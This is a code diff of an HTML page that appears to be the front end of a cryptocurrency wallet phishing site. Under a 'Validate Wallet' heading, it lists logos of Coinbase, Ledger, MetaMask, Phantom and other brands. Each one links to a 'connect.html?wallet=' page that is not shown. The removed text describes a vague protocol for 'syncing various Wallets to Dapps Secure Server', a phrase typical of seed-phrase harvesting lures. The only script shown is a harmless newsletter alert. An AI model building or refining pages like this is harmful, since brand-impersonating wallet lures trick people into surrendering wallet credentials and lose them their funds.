@@ -7,68 +7,97 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="ticker">
-        <div class="ticker-content">Powered by CoinMarketCap | BTC $50,000 | ETH $3,000 | SOL $150 | ADA $1.20</div>
-    </div>
-
-    <header class="wallet-header">
-        <div class="container">
-            <h1 class="wallet-title">Validate Wallet</h1>
+    <header class="header">
+        <div class="header-content">
+            <h1 class="logo">Wallet Validation</h1>
+            <nav class="nav">
+                <a href="index.html">Home</a>
+                <a href="wallets.html">Wallets</a>
+            </nav>
         </div>
     </header>
 
-    <main>
-        <section class="select-wallet">
-            <div class="container">
-                <h2>Select a Wallet</h2>
-                <div class="wallet-grid">
-                    <div class="wallet-card">
-                        <div class="wallet-icon" style="background: #0052FF;">C</div>
-                        <h3>Coinbase</h3>
-                        <p>coinbase.com</p>
-                    </div>
-                    <div class="wallet-card">
-                        <div class="wallet-icon" style="background: #000;">L</div>
-                        <h3>Ledger Live</h3>
-                        <p>ledger.com</p>
-                    </div>
-                    <div class="wallet-card">
-                        <div class="wallet-icon" style="background: #F16822;">M</div>
-                        <h3>Metamask</h3>
-                        <p>metamask.io</p>
-                    </div>
-                    <div class="wallet-card">
-                        <div class="wallet-icon" style="background: #4A90E2;">E</div>
-                        <h3>Electrum</h3>
-                        <p>electrum.org</p>
-                    </div>
-                    <div class="wallet-card">
-                        <div class="wallet-icon" style="background: #F0145A;">K</div>
-                        <h3>Kraken</h3>
-                        <p>kraken.com</p>
-                    </div>
-                    <div class="wallet-card">
-                        <div class="wallet-icon" style="background: #26A8EA;">T</div>
-                        <h3>Trust Wallet</h3>
-                        <p>trustwallet.com</p>
-                    </div>
-                </div>
-            </div>
-        </section>
+    <div class="ticker">
+        <span>Powered by CoinMarketCap | BTC $50,000 | ETH $3,000 | SOL $120</span>
+    </div>
 
-        <section class="launchpad">
-            <div class="container">
-                <h2>Decentralized Launchpad</h2>
-                <p>Open and decentralized protocol for syncing various Wallets to Dapps Secure Server. This is not an app but a protocol that establishes a remote connection between two apps and/or devices</p>
-                
-                <div class="subscribe">
-                    <input type="email" placeholder="name@email.com" id="subscribeEmail">
-                    <button class="subscribe-btn">▶</button>
-                </div>
-            </div>
-        </section>
-    </main>
+    <div class="wallet-header">
+        <h1 class="wallet-title">Validate Wallet</h1>
+    </div>
+
+    <section class="select-wallet">
+        <h2>Select a Wallet</h2>
+        <div class="wallet-grid">
+            <a href="connect.html?wallet=Coinbase" class="wallet-card">
+                <img src="https://logowik.com/content/uploads/images/coinbase-glyph.logowik.com.webp" alt="Coinbase Logo" class="wallet-logo">
+                <h3>Coinbase</h3>
+                <p>Secure and Simple</p>
+            </a>
+            <a href="connect.html?wallet=Ledger" class="wallet-card">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3d/Ledger_Nano_S_Transparent.png/440px-Ledger_Nano_S_Transparent.png" alt="Ledger Logo" class="wallet-logo">
+                <h3>Ledger Live</h3>
+                <p>Hardware Wallet</p>
+            </a>
+            <a href="connect.html?wallet=Metamask" class="wallet-card">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask Logo" class="wallet-logo">
+                <h3>MetaMask</h3>
+                <p>Browser Extension</p>
+            </a>
+            <a href="connect.html?wallet=Electrum" class="wallet-card">
+                <img src="https://electrum.org/favicon.png" alt="Electrum Logo" class="wallet-logo">
+                <h3>Electrum</h3>
+                <p>Bitcoin Wallet</p>
+            </a>
+            <a href="connect.html?wallet=Kraken" class="wallet-card">
+                <img src="https://cdn.worldvectorlogo.com/logos/kraken-exchange.svg" alt="Kraken Logo" class="wallet-logo">
+                <h3>Kraken</h3>
+                <p>Trading Exchange</p>
+            </a>
+            <a href="connect.html?wallet=TrustWallet" class="wallet-card">
+                <img src="https://trust-wallet-assets.oss-cn-shanghai.aliyuncs.com/images/tokens/1inch.png" alt="Trust Wallet Logo" class="wallet-logo">
+                <h3>Trust Wallet</h3>
+                <p>Mobile Wallet</p>
+            </a>
+            <a href="connect.html?wallet=Phantom" class="wallet-card">
+                <img src="https://phantombrand.io/images/mark_512x512.png" alt="Phantom Logo" class="wallet-logo">
+                <h3>Phantom</h3>
+                <p>Solana Wallet</p>
+            </a>
+            <a href="connect.html?wallet=WalletConnect" class="wallet-card">
+                <img src="https://avatars.githubusercontent.com/u/37784886?s=200&v=4" alt="WalletConnect Logo" class="wallet-logo">
+                <h3>WalletConnect</h3>
+                <p>Multi-Chain</p>
+            </a>
+            <a href="connect.html?wallet=WalletValidation" class="wallet-card">
+                <img src="https://img.icons8.com/color/96/000000/lock.png" alt="Wallet Validation Logo" class="wallet-logo">
+                <h3>Wallet Validation</h3>
+                <p>Verification Tool</p>
+            </a>
+        </div>
+    </section>
+
+    <section class="launchpad">
+        <h2>Custom Validator</h2>
+        <p>Join our decentralized launchpad community. Subscribe to our newsletter for updates on new validated wallets and security features.</p>
+        <div class="subscribe">
+            <input type="email" placeholder="Enter your email" id="email-input">
+            <button class="subscribe-btn" onclick="subscribeNewsletter()">Subscribe</button>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p>&copy; 2024 Wallet Validation. All rights reserved.</p>
+    </footer>
 
     <script src="script.js"></script>
+    <script>
+        function subscribeNewsletter() {
+            const email = document.getElementById('email-input').value;
+            if (email) {
+                alert('Thank you for subscribing: ' + email);
+                document.getElementById('email-input').value = '';
+            }
+        }
+    </script>
 </body>
 </html>
